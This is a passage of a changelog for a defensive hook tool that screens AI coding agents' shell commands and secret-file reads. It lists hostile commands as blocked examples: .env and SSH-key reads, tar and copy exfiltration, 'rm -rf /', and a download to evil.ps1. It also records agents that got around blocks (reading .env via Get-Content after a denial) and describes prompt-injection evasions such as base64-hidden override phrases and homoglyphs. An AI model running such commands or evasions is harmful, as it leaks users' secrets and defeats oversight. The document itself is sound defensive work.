  8-padded base64 override that must still be denied; a confusable-spoofed override on
  the literal layer and one hidden in base64 that must still be denied on the decoded
  layer; a bidi-override smuggled through base64 that must still be denied on the decoded
  layer; and a Cyrillic line label that must NOT fold into a fake role label. The
  existing literal homoglyph / bidi / variation-selector deny tests and the base64-
  decode-to-override-phrase deny test still pass.

## [0.5.1] - 2026-06-28

Adapter-only fixes (codex/agy shared shim). The Claude Code plugin and the core
hooks (`hooks/`) are **unchanged from 0.5.0** — a marketplace install is unaffected;
this matters only if you wire the codex or agy adapter from the repo.

### Fixed
- **agy adapter was inert.** Antigravity's `run_command` carries the command in
  `args.CommandLine` (PascalCase), but the shim only read `command`/`cmd`/`script`,
  so every agy command fell through unscreened. Now reads `CommandLine` (and write
  tools' `TargetFile`/`CodeContent`).
- **Native file reads bypassed the rules.** An agent could read `.env` with its own
  `view_file`/`read_file` tool instead of a shell command. The shim now maps native
  read/grep/find tools to shellter's sensitive-file check, so secret reads are
  blocked on the file-tool path too, not just via the shell.
- **agy hook-config corrected.** agy runs the hook command without a shell and does
  not strip quotes, resolving the path relative to `.agents/` — a quoted path
  produced `MODULE_NOT_FOUND` and the hook failed open. Docs now specify an
  unquoted, space-free, forward-slash path and a `.*` matcher (Go regex).

### Tests
- Added codex/agy shim cases for the real agy payload shape (`CommandLine`, native
  `view_file`, `TargetFile`/`CodeContent`): shim suite now 20. Unchanged: core hook
  suite 375, pi adapter 15, opencode adapter 13.

## [0.5.0] - 2026-06-27

Secret-exfiltration hardening across every shell, an anti-bypass notice that stops
an AI agent from routing around a block, and an experimental opencode adapter.

### Added
- **Sensitive-file reads blocked in PowerShell and cmd, not just bash.** The bash
  `cat .env` rule had no PowerShell/cmd equivalent, so `Get-Content .env`,
  `gc ~/.ssh/id_rsa`, `type .env`, `findstr ... .env`, `Format-Hex key.pem`,
  `Select-String`, and `[IO.File]::ReadAllText(...)` of a secret all walked through.
  Now denied. (Found live: an opencode agent read `.env` via `Get-Content` after its
  `read` tool was blocked.)
- **Broadened the bash/zsh/fish/macOS reader list** beyond `cat`/`head` to the common
  dumpers — `xxd`, `od`, `strings`, `base64`, `dd`, `openssl`, `gpg`, `jq`, `cut`,
  `tr`, … — so a secret can't be dumped around the `cat` rule on any POSIX shell or
  macOS Terminal.
- **`$(<secret)` shell file-read substitution** is now caught.
- **Copy/move/rename exfil blocked.** Copying a secret to a benign name and reading
  the copy is the obvious next move; `Copy-Item`/`cp`/`mv`/`Rename-Item`/`robocopy`/
  `[IO.File]::Copy` of a sensitive source (or the whole `.ssh`/`.aws`/`.gnupg` dir)
  is denied.
- **Inline-interpreter reads** (`python -c`, `node -e`, `ruby -e`, `perl -e`, `php`)
  that reference a sensitive path are denied.
- **Anti-bypass notice on every block.** Each deny/ask reason now tells the agent the
  block protects the user and not to bypass, re-encode, copy, or rename around it —
  stop and tell the user. In practice this turns a task-focused model away from
  probing workarounds (verified live: the agent stopped and explained instead of
  copying `.env` to a non-dotfile name).
- **Experimental opencode adapter** (`adapters/opencode/`). An opencode plugin that
  routes `tool.execute.before` through shellter's existing hooks (one shared
  detector), so dangerous Bash/PowerShell, sensitive-file access, and prompt
  injection are gated in opencode too. Verified live (blocks `.env` reads + the
  `Copy-Item` evasion). On Windows it maps opencode's `bash` tool to PowerShell so
  PS segmentation applies.
- **pi, codex, and agy (Antigravity CLI) adapters** (`adapters/pi/`,
  `adapters/codex/`, `adapters/agy/`, shared shim `adapters/shared/`). Every other
  agent CLI the user runs now routes through the same shellter detector:
  - **pi** — an extension subscribing to `tool_call`, returning `{ block, reason }`
    on deny/ask (verified against pi 0.80.2's type defs; 11/11 adapter tests).
  - **codex** — a `PreToolUse` command hook (Codex ≥ v0.124.0) via the shared shim;
    `deny` is hard-blocked, Tier-2 `ask` defers to Codex's own approval prompt.
    Shell interception is reliable; `apply_patch` file edits are best-effort.
  - **agy** — a `PreToolUse` hook via the shared shim; honors `deny`/`ask`/`allow`.
    Hook-config keys differ across agy builds, so the install doc says to verify
    against the installed build; the shim itself is field-defensive.
  - The shared `shellter-host-hook.js --host=codex|agy` normalizes each host's
    stdin payload into shellter's Claude-shaped JSON, spawns the existing hooks,
    and emits the host's verdict format (12/12 shared-shim tests).
  An opt-in passthrough LLM judge for the gray zone is still planned.
- **Archive exfil blocked.** `tar`/`zip`/`7z`/`gzip`/`xz`/`zstd`/`Compress-Archive`
  of a secret file or whole secret dir (`tar czf k.tgz ~/.ssh`) is denied — these
  were previously auto-approved.
- **Closed inline-interpreter gaps.** The eval-form set now covers `php -r`,
  `deno eval`, `node --eval`, and `perl -ne`/`-pe` (not just `-c`/`-e`).
- **More .NET reads** — `OpenText`/`OpenRead`/`StreamReader`, not only `ReadAllText`.
- **Leading-redirect reads** (`< .env cat`) are caught.

### Changed
- **Dev-workflow guards now ASK instead of hard-DENY.** `git push` to main / `--force`,
  `git reset --hard`/`clean -f`/`checkout --`, `sudo`, `ssh`/`scp`, SQL `DROP`/`TRUNCATE`,
  and `Start-Process -Verb RunAs` are mistake-guards, not malicious-skill attacks, so
  they surface for in-session approval rather than being blocked outright. Tier-1
  threats (secret exfil, RCE, prompt injection, persistence, miners) stay hard deny,
  and a hard deny on any part of a command always wins over an ask.
- **Fewer false positives.** Only the keys that make git run code as a side effect of
  normal git operations (`credential.helper`, `core.hooksPath`/`sshCommand`/`fsmonitor`,
  `init.templateDir`, `filter.*.clean/smudge`, `!`-aliases) are hard-blocked. The keys a
  developer legitimately sets but an attacker could abuse (`core.editor`/`pager`,
  `sequence.editor`, `diff.external`, `gpg.program`) now **ask** instead of deny.
  `git config user.name/email` is allowed. `.env.example`/`.sample`/`.template` are
  treated as placeholders, not secrets (`cp .env.example .env` is allowed). `credentials`
  only counts as a path segment or a file with an extension, so `rg credentials src/` is
  fine. Plain `curl`/`wget` POSTs are allowed; only uploads that reference a secret are
  blocked.

### Notes
- Detection stays pattern + heuristic. A determined agent that runs arbitrary code (a
  custom `python`/`node` script, an obfuscated path) can still read a file — no
  command-pattern hook fully prevents that. The real boundary for "the agent must
  never see this secret" is not exposing it to the agent (sandbox / secret manager);
  shellter raises the bar against the casual and obvious paths.
- **Evasions closed in security review** of the above: a secret after a quoted `;`
  inside an inline interpreter (`python -c "import os; open('.env')"`), a secret read
  via a copy *target* flag (`cp -t /exfil ~/.ssh/id_rsa`, `cp --target-directory=…`),
  and `scp`/`sftp` of a secret (hard-deny, above the plain remote-transfer ask).
- Test suite grew 329 -> 375 (hook), plus adapter suites (pi 11, shared codex/agy 12,
  opencode). The bash path stays byte-compatible for pre-existing cases.

## [0.4.1] - 2026-06-26

Distribution moved to a shared marketplace, plus plugin-load and destructive-`rm`
fixes.

### Fixed
- **Plugin hooks now actually load.** `plugin.json` referenced
  `./hooks/hooks.json` in its `hooks` field, but Claude Code auto-loads the
  standard `hooks/hooks.json` — the reference loaded it a second time, so the
  plugin failed with "Duplicate hooks file detected: Hook load failed" and
  shellter's hooks never registered (the plugin installed but did nothing).
  Removed the redundant `hooks` field; the standard file auto-loads. `manifest.hooks`
  is only for *additional* hook files beyond the standard one.
- **`rm -rf /` and `rm -rf ~` are now blocked.** The system-directory and
  home-directory rm rules anchored the target with a trailing `\b`, which never
  matches at end of string after a non-word char (`/`, `~`). So bare
  `rm -rf /`, `rm -rf / --no-preserve-root`, and `rm -rf ~` slipped through to a
  normal permission prompt instead of being denied (named targets like `/etc`,
  `/usr`, `/home`, `/*` were always caught). Both anchors are corrected; the
  PowerShell rules already anchored with `(\s|$|\*)` and were unaffected.

### Changed
- **Marketplace moved to `walangstudio/marketplace`.** shellter no longer
  self-hosts a marketplace (`.claude-plugin/marketplace.json` is removed from this
  repo). It's now one plugin in the Walang Studio catalog, alongside future
  projects. The install path changes to:
  ```
  /plugin marketplace add walangstudio/marketplace
  /plugin install shellter@walangstudio
  ```
  If you added the old `walangstudio/shellter` marketplace, remove it with
  `/plugin marketplace remove shellter`, then add `walangstudio/marketplace`.

### Notes
- The plugin's distribution catalog moved to its own repo; the only hook-logic
  change is the `rm` deny-rule fix above. Test suite grew 324 → 329.

## [0.4.0] - 2026-06-26

Distribution. shellter is now a Claude Code plugin with its own marketplace, so
installing it is two commands instead of copy-the-scripts-and-merge-settings.

### Added
- **Claude Code plugin + marketplace.** The repo is both a marketplace
  (`.claude-plugin/marketplace.json`) and the plugin (`.claude-plugin/plugin.json`
  + `hooks/hooks.json`). Install with:
  ```
  /plugin marketplace add walangstudio/shellter
  /plugin install shellter@shellter
  ```
  The PreToolUse hooks (Bash/PowerShell gating + Read/Write/Edit/Glob/Grep
  protection) register automatically via `${CLAUDE_PLUGIN_ROOT}`, with a
  `commandWindows` variant so it works on Windows too. No `merge-settings.js`,
  no hand-editing `settings.json`.

### Notes
- The manual install (`merge-settings.js` + copying hooks) still works and is the
  path for non-plugin clients. If you switch to the plugin, remove the manual
  hooks from `~/.claude/settings.json` so they don't double-fire.
- Plugin hooks are additive with your own settings hooks and use the same
  `permissionDecision` protocol; the most restrictive decision wins.
- No hook-logic changes from 0.3.0 — this release is packaging only.

## [0.3.0] - 2026-06-26

Until now the hooks judged a command by its text alone. `bash install.sh` told
them nothing about what `install.sh` actually does, so a script whose body was
`curl … | sh` walked straight through. This release reads the script.

### Added
- **Script-content scanning.** When a command executes a local script
  (`bash`/`sh`/`zsh`/`dash`/`ash`/`ksh`/`fish X`, `./X`, `source X` / `. X`,
  `powershell`/`pwsh -File X`, `& ./X.ps1`), `check-bash.js` resolves the path
  against the call's `cwd`, reads the first 256 KB, and scans the contents for
  download-pipe-to-shell, `/dev/tcp` reverse shells, base64/xxd decode-then-exec,
  `-EncodedCommand` / `IEX` / `.DownloadString(`, AMSI bypass, and LOLBins
  (`certutil`/`bitsadmin`/`mshta`/`regsvr32`). High-risk + untrusted returns
  `ask` with a message naming the pattern, file, and line, and telling you to
  open and read the script yourself. I/O happens only when a script-exec shape
  matches, so the hot path is untouched.
- **Content-hash trust store** (`~/.claude/shellter-trust.json`, override with
  `SHELLTER_TRUST_FILE`) plus a `shellter-trust.js` CLI (`add` / `list` /
  `remove`). Trust is keyed by the hash of the scanned window, so a trusted
  script survives moves/renames but re-flags after an edit.
- **Native allow-rule honoring.** A `Bash(...)` / `PowerShell(...)` allow-rule
  from your project/user settings (e.g. from picking "Yes, don't ask again")
  also silences a script flag. Match is conservative (exact or `:*` prefix).
- **`scan-content.js`**, a shared zero-dependency scanner with a severity model
  (only `high` drives a decision; `medium`/`low` are advisory).
- **Hardened prompt-injection detection** in written content: variation-selector
  smuggling (U+FE00–FE0F / U+E0100–E01EF), a recursive invisible-strip that
  survives interleaved-surrogate re-forming, homoglyph / mixed-script tokens,
  broadened role markers (ChatML / Llama / Mistral, line-start fake transcripts),
  Policy-Puppetry config tags, MCP tool-poisoning `<IMPORTANT>` blocks,
  override-phrase + exfil-target co-occurrence, and a bounded base64/hex
  decode-one-layer-then-rescan.

### Changed
- `source X` / `. X` is no longer blanket auto-approved. It now routes through
  the script scanner: clean is allowed (unchanged behavior), dangerous + untrusted
  asks, trusted is allowed.

### Notes
- New decision: `check-bash.js` can now return `ask` (it previously only emitted
  `allow`/`deny`). Selectable via the `SCRIPT_RISK_DECISION` constant — flip to
  `'deny'` if a Claude Code build doesn't surface `ask` reasons.
- Detection is pattern + heuristic, pure JS, zero new dependencies. No offline,
  no-runtime ML detector is light enough to vendor into a sub-100ms hook;
  heuristics raise attacker cost and catch the known shapes, they are not
  complete (base32, novel framings, and multi-turn attacks can still evade).
- Test suite grew from 282 to 324 cases. The bash path stays byte-compatible for
  every pre-existing case.

## [0.2.0] - 2026-05-24

The cross-platform release. Until now the hooks only really understood Unix
bash. PowerShell commands were waved through with bash-shaped rules, which is
about as useful as a screen door on a submarine.

### Added
- PowerShell support. `check-bash.js` now branches on `tool_name`: bash keeps its
  Unix and macOS parsing, PowerShell gets a PowerShell-aware splitter (backtick is
  an escape char, not command substitution) and its own deny and approve sets.
- PowerShell deny rules: `Remove-Item -Recurse -Force` of home/root/wildcard,
  `Invoke-Expression`/`iex`, download-and-run (`iwr | iex`, `-OutFile`,
  `DownloadString`), `-EncodedCommand`, `Set-ExecutionPolicy`, Defender tampering
  (`Set-MpPreference`), service / scheduled-task / Run-key / `$PROFILE`
  persistence, `Start-Process -Verb RunAs`, and lsass memory dumps.
- cmd.exe deny rules, caught whether typed directly or shelled out from bash via
  `cmd /c`: `del`/`rmdir /s`, `format`, `vssadmin delete shadows`, `bcdedit`,
  `reg add ...\Run`, `schtasks /create`, `sc create`, `net user ... /add`,
  `netsh advfirewall`, `takeown`, `icacls /grant`, and the usual LOLBins
  (`certutil`, `bitsadmin`, `mshta`, `regsvr32`, `rundll32`).
- macOS deny rules: `csrutil disable`, `spctl --master-disable`, `launchctl` and
  LaunchAgents/LaunchDaemons persistence, Keychain extraction via `security`,
  `dscl` user creation, `kextload`, `tccutil reset`, `diskutil erase`, and
  `xattr -d com.apple.quarantine`.
- PowerShell read-only approves so Windows sessions are not prompted for every
  `Get-ChildItem`. Conservative on purpose: only inspection cmdlets and their
  canonical aliases.
- File hook now blocks macOS Keychain databases, Windows registry hives
  (`NTUSER.DAT`, `SAM`, `SYSTEM`), Windows credential vaults, and `.ppk` keys.
- `fish` joins the recognized POSIX-family shells (`sh`, `zsh`, `dash`, `ash`,
  `ksh`), so `fish -c '...'` is unwrapped and `... | fish` is denied like the rest.
- `package.json` and this changelog, so there is finally a version to point at.

### Changed
- `curl` and `wget` auto-approve is now bash-only. On PowerShell those names are
  aliases for `Invoke-WebRequest`, and the old rule cheerfully approved
  `curl <url> -OutFile evil.ps1`. It does not anymore.
- The git force-push and reset guards now see past global options like
  `--no-pager`, `--git-dir=`, and `-C`/`-c`, so `git --no-pager push --force` no
  longer walks straight past them.
- `rm -rf` of a system directory now also covers the macOS roots `/System`,
  `/Library`, `/Applications`, `/Users`, `/Volumes`, and `/private`.

### Fixed
- PowerShell commands containing a backtick are no longer mis-split, so a
  dangerous statement after one cannot hide from the per-statement checks.

### Notes
- Project renamed from `claude-settings` to `shellter`.
- Test suite grew from 173 to 212 cases. The bash path is byte-identical to 0.1.0,
  proven by the original cases still passing untouched.

## [0.1.0] - 2026-05-09

The starting point: everything the hooks did before we began versioning. Two
PreToolUse hooks, `check-bash.js` for commands and `check-sensitive-files.js` for
file access, auto-allowing the safe, blocking the obviously dangerous, and
prompting for everything in between.

This bundles the original hooks and a later hardening pass, since no versions
were cut in between:
- Recursive checking inside `bash -c`, `sh -c`, `find -exec`, `xargs`, and
  `<(...)` / `>(...)` process substitution, so a wrapper cannot hide a payload.
- Symlink resolution in the file hook (`safeRealpath`), defeating the
  `ln -s ~/.env /tmp/x; Read /tmp/x` trick.
- Unicode normalization on command input and steganography detection in written
  content.
- Deny rules for reverse shells, exfiltration, encoded payloads, privilege
  escalation, git identity/hook/credential backdoors, shell-rc and CI-config
  persistence, kernel module load, loader injection, crypto miners, and the
  destructive `rm`/`git push --force`/`reset --hard` family.
- Approves for read-only git, `gh`, `go`, `kubectl`, `terraform`, `helm`, the
  common Python/JS/TS linters and formatters, and standard read-only Unix tools.
- Sensitive-file coverage for keys, credential files, wallets, and browser cookie
  databases, plus prompt-injection and token-shape detection in written content.
- Opt-in audit log via `CLAUDE_HOOK_LOG` and `CLAUDE_HOOK_DEBUG`.

[0.5.2]: https://github.com/walangstudio/shellter/releases/tag/v0.5.2
[0.5.1]: https://github.com/walangstudio/shellter/releases/tag/v0.5.1
[0.5.0]: https://github.com/walangstudio/shellter/releases/tag/v0.5.0
[0.4.1]: https://github.com/walangstudio/shellter/releases/tag/v0.4.1
[0.4.0]: https://github.com/walangstudio/shellter/releases/tag/v0.4.0
[0.3.0]: https://github.com/walangstudio/shellter/releases/tag/v0.3.0
[0.2.0]: https://github.com/walangstudio/shellter/releases/tag/v0.2.0
[0.1.0]: https://github.com/walangstudio/shellter/releases/tag/v0.1.0
